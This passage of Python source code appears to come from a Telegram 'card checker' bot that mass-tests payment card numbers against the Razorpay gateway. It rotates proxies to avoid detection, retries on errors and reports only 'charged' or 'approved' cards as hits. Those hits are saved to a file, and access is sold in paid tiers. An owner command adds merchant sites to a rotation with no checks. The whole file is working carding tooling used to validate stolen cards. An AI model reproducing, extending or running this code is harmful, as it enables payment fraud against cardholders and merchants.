            
            async with semaphore:
                max_retries = 2  # 2 retries for HTTP 500
                retry_count = 0
                last_result = None
                
                while retry_count <= max_retries:
                    await speed_controller.wait_if_needed()
                    start = time.time()
                    
                    # Get proxy for this card (rotating)
                    proxy_str = None
                    if user_proxies:
                        proxy_str = user_proxies[proxy_index % len(user_proxies)]
                        proxy_index += 1
                    
                    # Check card using API pool
                    result = await razorpay_api_pool.check_card_with_pool(card, proxy_str, u_id)
                    elapsed = time.time() - start
                    speed_controller.record_response(elapsed)
                    
                    # Check if it's HTTP 500 error
                    error_msg = result.get("message", "")
                    is_http_500 = "HTTP 500" in error_msg or "500" in error_msg or result.get("status") == "error"
                    
                    if is_http_500 and retry_count < max_retries:
                        retry_count += 1
                        print(f"🔄 [RETRY #{retry_count}] HTTP 500 error for card {card[:20]}..., retrying...")
                        stats["retries_used"] += 1
                        await asyncio.sleep(2)  # Wait 2 seconds before retry
                        continue
                    else:
                        last_result = result
                        break
                
                result = last_result
                
                # Get BIN info
                bin_info = await get_bin_info(card)
                
                # Get response
                response_msg = result.get("message", "")
                status_category = result.get("status_category", "unknown")
                api_used = result.get("api_used", "unknown")
                
                # Update stats
                async with stats_lock:
                    processed_count += 1
                    
                    if api_used not in stats["api_usage"]:
                        stats["api_usage"][api_used] = 0
                    stats["api_usage"][api_used] += 1
                    
                    # Only count actual card results, errors are hidden
                    if status_category == "charged":
                        stats["charged"] += 1
                        stats["approved"] += 1
                        print(f"🔥 [CHARGED] {card[:20]}...")
                    elif status_category == "approved":
                        stats["approved"] += 1
                        print(f"✅ [APPROVED] {card[:20]}...")
                    elif status_category == "declined":
                        stats["declined"] += 1
                        print(f"❌ [DECLINED - HIDDEN] {card[:20]}...")
                    else:
                        # Errors are treated as declined (not shown in errors count)
                        stats["declined"] += 1
                        print(f"⚠️ [ERROR - TREATED AS DECLINED] {card[:20]}...")
                    
                    if processed_count % 10 == 0 or processed_count == total:
                        await update_progress(processed_count)
                
                # ONLY SEND RESULT FOR CHARGED OR APPROVED CARDS
                if status_category in ["charged", "approved"]:
                    ui, _ = format_razorpay2_response(result, card, bin_info)
                    try:
                        await message.reply_text(ui, parse_mode=ParseMode.HTML)
                        print(f"📤 [SENT RESULT] {card[:20]}...")
                    except Exception as e:
                        print(f"❌ Error sending result: {e}")
                    
                    # Save hit to file
                    await save_hit_to_file(
                        card=card, gateway="Razorpay",
                        response=response_msg,
                        price="₹100",
                        bin_info=bin_info, user_id=u_id, user_tier=tier
                    )
                    
                    if status_category == "charged":
                        user_data = user_manager.get_user(u_id)
                        await send_hit_notification(
                            context=context, gateway="Razorpay", card=card,
                            response=response_msg,
                            price="₹1",
                            user=user_data, bin_info=bin_info, status_category="charged"
                        )
                        user_manager.increment_hits(u_id)
                    else:
                        user_manager.increment_hits(u_id)
                
                user_manager.increment_checks(u_id, 1)
                return result, card
        
        # Process all cards
        tasks = [process_single_card_with_retry(card, idx) for idx, card in enumerate(cards)]
        
        for coro in asyncio.as_completed(tasks):
            if u_id not in razorpay_active_tasks:
                break
            try:
                await coro
            except Exception as e:
                print(f"❌ Task error: {e}")
                async with stats_lock:
                    # Errors are treated as declined, not shown in errors count
                    stats["declined"] += 1
        
        # Final update (no need to send separate summary message)
        if u_id in razorpay_active_tasks:
            await update_progress(total)
            print(f"📊 Final progress updated for user {u_id}")
            
            # Build API usage summary
            api_summary = ""
            if stats["api_usage"]:
                api_summary = "\n📊 <b>API Usage:</b>\n"
                for api_name, count in sorted(stats["api_usage"].items(), key=lambda x: x[1], reverse=True):
                    api_summary += f"   • {api_name}: {count} cards\n"
            
            # Send final summary with errors = 0
            charged_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
            approved_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
            declined_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
            errors_emoji = premium_emoji(PREMIUM_EMOJI_IDS["error"], "⚠️")
            total_emoji = premium_emoji(PREMIUM_EMOJI_IDS["stats"], "📝")
            time_emoji = premium_emoji(PREMIUM_EMOJI_IDS["time"], "⏱️")
            skull_emoji = premium_emoji(PREMIUM_EMOJI_IDS["skull"], "💀")
            
            summary = (
                f"{skull_emoji} <b>Razorpay Mass Check Complete</b>\n\n"
                f"{charged_emoji} <b>Charged</b> ➛ {stats['charged']}\n"
                f"{approved_emoji} <b>Approved</b> ➛ {stats['approved']}\n"
                f"{declined_emoji} <b>Declined</b> ➛ {stats['declined']}\n"
                f"{errors_emoji} <b>Errors</b> ➛ 0\n"
                f"{total_emoji} <b>Total</b> ➛ {total}\n"
                f"{time_emoji} <b>Time</b> ➛ {int((time.time() - start_time)//60)}m {int((time.time() - start_time)%60)}s\n"
                f"{skull_emoji} <b>Bot</b> ➛ @BLADESARKS_V3bot"
            )
            
            
            
            await message.reply_text(summary, parse_mode=ParseMode.HTML)
            print(f"📊 Final summary sent to user {u_id}")
        
        return stats
        
    except Exception as e:
        print(f"❌ Razorpay mass check error: {e}")
        traceback.print_exc()
        try:
            if progress_msg:
                await progress_msg.edit_text(f"❌ Error: {str(e)[:100]}")
            else:
                await message.reply_text(f"❌ Error: {str(e)[:100]}")
        except:
            pass
    finally:
        razorpay_active_tasks.pop(u_id, None)
        print(f"🏁 [Razorpay Mass] Session ended for user {u_id}")
        
async def mass_check_razorpay_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass card check with Razorpay gateway using API pool - /mrz"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    message = update.effective_message
    
    if not user_manager.can_access_gateway(user_id, 'razorpay'):
        await message.reply_text("❌ Your tier doesn't have access to Razorpay gateway.")
        return
    
    if not user_manager.can_mass_check(user_id):
        tier = user_manager.get_tier(user_id)
        await message.reply_text(
            f"❌ Mass check not available for {tier.upper()} tier.\n\n"
            f"Use /rz for single checks.\n"
            f"💎 Upgrade to Premium/Ultimate for mass checks.",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Check if reply to file
    if message.reply_to_message and message.reply_to_message.document:
        try:
            file = await message.reply_to_message.document.get_file()
            content = await file.download_as_bytearray()
            content = content.decode('utf-8', errors='ignore')
            
            cards = []
            for line in content.splitlines():
                line = line.strip()
                if line and not line.startswith('#'):
                    card = card_formatter.extract_single_card_from_text(line)
                    if card:
                        cards.append(card)
            
            if not cards:
                await message.reply_text("❌ No valid cards found in file.")
                return
                
            # Delete command message
            try:
                await message.delete()
            except:
                pass
            
            # ============ PASS progress_msg=None to let function create it ============
            await razorpay_mass_check_with_pool(update, context, cards, None)
            return
            
        except Exception as e:
            await message.reply_text(f"❌ Error reading file: {str(e)[:100]}")
            return
    
    # Handle direct text input
    if not context.args:
        await message.reply_text(
            "📦 <b>Razorpay Mass Check (API Pool)</b>\n\n"
            "Usage: <code>/mrz &lt;card1&gt; &lt;card2&gt; ...</code>\n"
            "Or reply to a .txt file with /mrz\n\n"
            "Example: <code>/mrz 4111111111111111|12|2028|123 4222222222222222|11|2026|456</code>\n\n"
            "💰 Amount: ₹100\n"
            "📍 Gateway: Razorpay (Multiple APIs)\n"
            "✅ Only charged/approved cards will be shown",
            parse_mode=ParseMode.HTML
        )
        return
    
    cards_text = " ".join(context.args)
    card_strings = cards_text.split()
    
    cards = []
    for card_str in card_strings:
        card = card_formatter.extract_single_card_from_text(card_str)
        if card:
            cards.append(card)
    
    if not cards:
        await message.reply_text("❌ No valid cards found.")
        return
    
    # Check batch size limit
    max_batch = user_manager.get_max_batch_size(user_id)
    if len(cards) > max_batch:
        cards = cards[:max_batch]
        await message.reply_text(f"⚠️ Your tier allows max {max_batch} cards. Truncating.")
    
    # Delete command message
    try:
        await message.delete()
    except:
        pass
    
    # ============ PASS progress_msg=None to let function create it ============
    await razorpay_mass_check_with_pool(update, context, cards, None)
        

        
        
        
async def admin_direct_add_site_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin command to directly add sites to rotation - /sadd (no checks)"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only the owner can use this command.")
        return
    
    # Check if replying to a file
    if update.message.reply_to_message and update.message.reply_to_message.document:
        await handle_sadd_file_direct(update, context)
        return
    
    if not context.args:
        await update.message.reply_text(
            "➕ <b>Direct Site Add (Admin) - NO CHECKS</b>\n\n"
            "<b>Methods:</b>\n\n"
            "1️⃣ <b>Reply to a .txt file:</b>\n"
            "   Send a .txt file with sites (one per line) and reply with <code>/sadd</code>\n\n"
            "2️⃣ <b>Direct text input:</b>\n"
            "   <code>/sadd &lt;site1&gt; &lt;site2&gt; ...</code>\n\n"
            "<b>Examples:</b>\n"
            "<code>/sadd example.com</code>\n"
            "<code>/sadd site1.com site2.com site3.com</code>\n\n"
            "<b>⚠️ Sites are added DIRECTLY to rotation - NO CHECKS performed!</b>",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Process direct text input - add sites directly
    await process_sadd_sites_direct(update, context, context.args)


async def process_sadd_sites_direct(update: Update, context: ContextTypes.DEFAULT_TYPE, sites_input):
    """Process and add sites directly to rotation - NO CHECKS"""
    user_id = update.effective_user.id
    message = update.effective_message
    user = update.effective_user
    
    # Convert input to list if it's not already
    if isinstance(sites_input, (list, tuple)):
        sites_list = list(sites_input)
    else:
        sites_list = list(sites_input)
    
    status_msg = await message.reply_text(
        f"📥 <b>Adding sites directly to rotation...</b>\n\n"
        f"Found {len(sites_list)} site(s) to add.\n"
        f"⚠️ NO CHECKS performed - adding directly!",
        parse_mode=ParseMode.HTML
    )
    
    added = []
    already_exist = []
    invalid_format = []
    
    for site in sites_list:
        site = site.strip()
        if not site:
            continue
        
        # Normalize the site URL
        try:
            normalized_site = autosopi_site_manager.normalize_site_url(site)
            
            # Basic validation - check if it looks like a domain
            if not normalized_site or '.' not in normalized_site:
                invalid_format.append(site)
                continue
            
            # Check if already in rotation
            if normalized_site in autosopi_site_manager.sites:
                already_exist.append(normalized_site)
                continue
            
            # Add the site directly - NO CHECKS
            autosopi_site_manager.sites.append(normalized_site)
            
            # Initialize stats for this site
            autosopi_site_manager.site_stats[normalized_site] = {
                'successes': 0,
                'failures': 0,
                'total': 0,
                'added_by': user_id,
                'added_at': time.time(),
                'added_by_name': f"Admin (Direct - {user.first_name})",
                'added_via': 'sadd_direct'
            }
            
            # Initialize failures (0)
            autosopi_site_manager.site_failures[normalized_site] = 0
            
            added.append(normalized_site)
            print(f"✅ Added site directly: {normalized_site}")
            
        except Exception as e:
            print(f"❌ Site add failed: {site} - {e}")
            invalid_format.append(site)
    
    # Save the updated sites
    autosopi_site_manager.save_sites()
    
    # Prepare response message
    result_msg = f"➕ <b>Direct Site Addition Complete</b>\n\n"
    result_msg += f"📊 <b>Summary:</b>\n"
    result_msg += f"   ✅ Added: {len(added)}\n"
    result_msg += f"   ⚠️ Already in rotation: {len(already_exist)}\n"
    result_msg += f"   ❌ Invalid format: {len(invalid_format)}\n"
    result_msg += f"━━━━━━━━━━━━━━━━━━━\n"
    
    if added:
        result_msg += f"\n✅ <b>Added Sites ({len(added)}):</b>\n"
        for site in added[:20]:
            result_msg += f"  • <code>{site}</code>\n"
        if len(added) > 20:
            result_msg += f"  ... and {len(added) - 20} more\n"
    
    if already_exist:
        result_msg += f"\n⚠️ <b>Already in rotation ({len(already_exist)}):</b>\n"
        for site in already_exist[:10]:
            result_msg += f"  • <code>{site}</code>\n"
        if len(already_exist) > 10:
            result_msg += f"  ... and {len(already_exist) - 10} more\n"
    
    if invalid_format:
        result_msg += f"\n❌ <b>Invalid format ({len(invalid_format)}):</b>\n"
        for site in invalid_format[:10]:
            result_msg += f"  • <code>{site}</code>\n"
    
    result_msg += f"\n━━━━━━━━━━━━━━━━━━━\n"
    result_msg += f"📊 Total sites in rotation: {len(autosopi_site_manager.sites)}\n"
    result_msg += f"💡 Use <code>/sites</code> to see all sites"
    
    await status_msg.edit_text(result_msg, parse_mode=ParseMode.HTML, reply_markup=back_menu())


async def handle_sadd_file_direct(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle .txt file for /sadd command - add directly with NO CHECKS"""
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only the owner can use this command.")
        return
    
    try:
        # Get the file
        file = await update.message.reply_to_message.document.get_file()
        content = await file.download_as_bytearray()
        content = content.decode('utf-8', errors='ignore')
        
        # Parse sites from file (one per line)
        sites = []
        for line in content.splitlines():
            line = line.strip()
            # Skip empty lines and comments
            if line and not line.startswith('#'):
                # Remove any trailing commas or extra spaces
                line = line.rstrip(',').strip()
                if line:
                    sites.append(line)
        
        if not sites:
            await update.message.reply_text("❌ No sites found in the file.")
            return
        
        # Process the sites
        await process_sadd_sites_direct(update, context, sites)
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error reading file: {str(e)[:100]}")
        
        
async def test_site_with_proxy(site: str, proxy: str = None, timeout: int = 20) -> Tuple[bool, str]:
    """
    Test if a site is accessible with proxy support - INCREASED TIMEOUT
    """
    try:
        # Normalize URL
        if not site.startswith(('http://', 'https://')):
            test_url = f"https://{site}"
        else:
            test_url = site
        
        # Configure client with proxy and longer timeout
        client_kwargs = {
            'timeout': httpx.Timeout(timeout, connect=10.0, read=15.0),
            'verify': False,
            'follow_redirects': True
        }
        
        if proxy:
            proxy_url = format_proxy(proxy)
            if proxy_url:
                client_kwargs['proxy'] = proxy_url
                print(f"🔌 Testing site with proxy: {mask_proxy(proxy_url)}")
        
        async with httpx.AsyncClient(**client_kwargs) as client:
            response = await client.get(test_url, headers={
                'User-Agent': generate_user_agent()
            })
            
            if response.status_code == 200:
                return True, f"Site accessible (HTTP {response.status_code})"
            elif response.status_code in [301, 302, 307, 308]:
                return True, f"Redirect (HTTP {response.status_code})"
            else:
                return False, f"HTTP {response.status_code}"
                
    except httpx.TimeoutException:
        return False, f"Timeout after {timeout}s"
    except httpx.ProxyError as e:
        return False, f"Proxy error: {str(e)[:30]}"
    except httpx.ConnectError:
        return False, "Connection failed"
    except Exception as e:
        return False, str(e)[:50]
        
        



